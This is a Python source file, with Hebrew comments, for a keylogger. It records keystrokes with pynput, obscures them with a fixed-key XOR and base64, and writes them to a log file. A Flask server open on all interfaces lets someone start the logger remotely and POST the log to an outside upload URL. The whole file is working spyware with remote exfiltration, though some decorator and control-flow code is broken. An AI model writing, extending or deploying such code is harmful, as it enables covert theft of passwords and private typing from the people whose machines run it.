import base64
from datetime import datetime
import threading
from pynput import keyboard
import time
from flask import Flask, request
import requests

app = Flask(__name__)

url = "https://example.com/upload"


@app.route('/get_file', methods=['GET'])
def upload_file():
    with open("encrypted_logs.txt", "rb") as f:
        encoded_content = base64.b64encode(f.read()).decode("utf-8")
    data = {"filename": "encrypted_logs.txt", "content": encoded_content}
    headers = {"Content-Type": "application/json"}
    response = requests.post(url, json=data, headers=headers)
    print(response.text)
    return 'Data received', 200


@app.route('/time_to_run/<value>', methods=['GET'])
def process(value):
    print(value)
    KeyLogger(int(value)).stop_after_time()
    return "KeyLogger started listening", 200


@app.route('/time_to_run', methods=['GET'])
class KeyLogger:
    def __init__(self, run_time):
        self.run_time = run_time
        self.current_keys = []
        self.lock = threading.Lock()
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def on_press(self, key):
        with self.lock:
            try:
                # טיפול במקשים מיוחדים ומקשים רגילים
                if hasattr(key, 'char') and key.char is not None:
                    self.current_keys.append(key.char)
                else:
                    self.current_keys.append(str(key).replace("Key.", ""))
            except Exception as e:
                print(f"שגיאה: {e}")

    def stop_after_time(self):
        for _ in range(self.run_time):
            time.sleep(60)  # המתנה דקה

            # איסוף והעברת הנתונים להצפנה
            with self.lock:
                keys_copy = self.current_keys.copy()
                self.current_keys.clear()

            log_time = datetime.now().strftime("%d/%m/%Y %H:%M")
            keys_str = ",".join(keys_copy)
            encrypted_str = EncryptorDecryptor.encrypt(keys_str)

            # כתיבה לקובץ
            with open("encrypted_logs.txt", "a", encoding="utf-8") as f:
                f.write(f"[{log_time}] {encrypted_str}\n")

        self.listener.stop()


class EncryptorDecryptor:
    key = "613".encode('utf-8')  # מפתח קבוע להצפנה

    @classmethod
    def encrypt(cls, data):
        """מצפין נתונים ומחזיר מחרוזת base64"""
        data_bytes = data.encode('utf-8')
        encrypted = bytes([data_bytes[i] ^ cls.key[i % len(cls.key)] for i in range(len(data_bytes))])
        return base64.b64encode(encrypted).decode('utf-8')

    @classmethod
    def decrypt(cls, filename):
        """פיענוח הקובץ המוצפן והדפסת התוצאה"""
        with open(filename, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue

                # הפרדת התאריך מהטקסט המוצפן
                timestamp_end = line.find(']')
                if timestamp_end == -1:
                    continue

                encrypted_b64 = line[timestamp_end + 2:].strip()
                # תיקון ריפוד למחרוזת base64
                encrypted_b64 += '=' * ((4 - len(encrypted_b64) % 4) % 4)

                try:
                    encrypted_data = base64.b64decode(encrypted_b64)
                except Exception as e:
                    print(f"שגיאה בפיענוח base64: {e}")
                    continue

                # פענוח הנתונים
                decrypted = bytes([encrypted_data[i] ^ cls.key[i % len(cls.key)] for i in range(len(encrypted_data))])
                decrypted_str = decrypted.decode('utf-8', errors='replace')
                print(f"{line[:timestamp_end + 1]} {decrypted_str}")


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

KeyLogger(10).stop_after_time()

decrypt = input("Decrypt the file? (y/n): ")
if decrypt.lower() == 'y':
    EncryptorDecryptor.decrypt("encrypted_logs.txt")
